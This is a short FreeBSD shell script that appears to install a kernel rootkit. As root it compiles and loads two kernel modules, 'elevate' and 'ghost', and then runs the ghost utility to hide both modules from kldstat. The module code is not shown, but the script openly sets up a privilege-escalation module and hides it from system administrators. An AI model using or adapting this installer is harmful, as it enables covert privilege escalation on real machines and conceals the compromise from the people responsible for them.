#!/bin/sh

uid=$(id -u)

if [ "$uid" -ne 0 ]; then
  echo "Install script must be executed as root"
  exit 1
fi

klds="elevate ghost"

for kld in ${klds}; do
  # Clean kld
  make -f "Makefile.$kld" clean

  # Compile KLD
  make -f "Makefile.$kld"

  if [ "$?" -ne 0 ]; then
    echo "Error: failed to compile $kld KLD"
    continue
  fi

  # Load klds
  if [ -e "./$kld.ko" ]; then
    kldload "./$kld.ko"
    if [ "$?" -ne 0 ]; then
      echo "Error: failed to load $kld.ko with kldload"
      continue
    fi
  else
    echo "Error: could not find $kld.ko"
    continue
  fi
done

# Clean and compile all utility binaries
make -f Makefile.bin clean
make -f Makefile.bin
if [ "$?" -ne 0 ]; then
  echo "Error: failed to compile binaries"
  exit 1
fi

# Hide KLDs with ghost utility, add other klds here to hide them
# Pass in module name found via kldstat -v
if [ -e "./ghost" ]; then
  ./ghost elevate
  ./ghost ghost
else
  echo "Error: could not find ghost utility, kld will not be hidden"
fi
